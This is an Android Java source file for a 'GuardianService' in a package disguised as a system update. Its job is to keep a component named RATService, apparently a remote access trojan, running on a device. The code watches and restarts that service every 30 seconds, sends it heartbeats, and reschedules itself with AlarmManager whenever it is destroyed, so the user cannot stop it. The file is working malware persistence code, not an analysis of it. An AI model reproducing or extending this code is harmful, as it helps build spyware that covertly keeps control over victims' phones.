package com.android.system.update;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import java.util.Timer;
import java.util.TimerTask;

public class GuardianService extends Service {
    
    private static final String TAG = "GuardianService";
    private static final long CHECK_INTERVAL = 30000; // 30 seconds
    private Timer timer;
    private boolean isBound = false;
    private RATService.RATServiceBinder ratServiceBinder;
    
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            if (service instanceof RATService.RATServiceBinder) {
                ratServiceBinder = (RATService.RATServiceBinder) service;
                isBound = true;
                Log.d(TAG, "Connected to RATService");
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            isBound = false;
            ratServiceBinder = null;
            Log.d(TAG, "Disconnected from RATService");
            
            // RATService crashed, restart it
            restartRATService();
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "GuardianService created");
        
        // Bind to RATService for monitoring
        bindToRATService();
        
        // Start monitoring timer
        startMonitoring();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Keep service alive
    }
    
    private void bindToRATService() {
        Intent intent = new Intent(this, RATService.class);
        bindService(intent, connection, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT);
    }
    
    private void startMonitoring() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkServices();
            }
        }, CHECK_INTERVAL, CHECK_INTERVAL);
    }
    
    private void checkServices() {
        // Check if RATService is running
        if (!isServiceRunning(RATService.class)) {
            restartRATService();
        }
        
        // If bound but connection died, reconnect
        if (!isBound) {
            bindToRATService();
        }
        
        // Send heartbeat to RATService if connected
        if (isBound && ratServiceBinder != null) {
            try {
                ratServiceBinder.heartbeat();
            } catch (RemoteException e) {
                Log.e(TAG, "Heartbeat failed", e);
                isBound = false;
                ratServiceBinder = null;
            }
        }
    }
    
    private void restartRATService() {
        Log.d(TAG, "Restarting RATService");
        Intent intent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        // Try to rebind
        bindToRATService();
    }
    
    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : 
                manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service for external clients
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        if (isBound) {
            unbindService(connection);
        }
        
        // Reschedule self using AlarmManager
        scheduleRestart();
    }
    
    private void scheduleRestart() {
        android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, GuardianService.class);
        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getService(
            this, 0, intent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 5000, pendingIntent);
        } else {
            alarmManager.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 5000, pendingIntent);
        }
    }
}
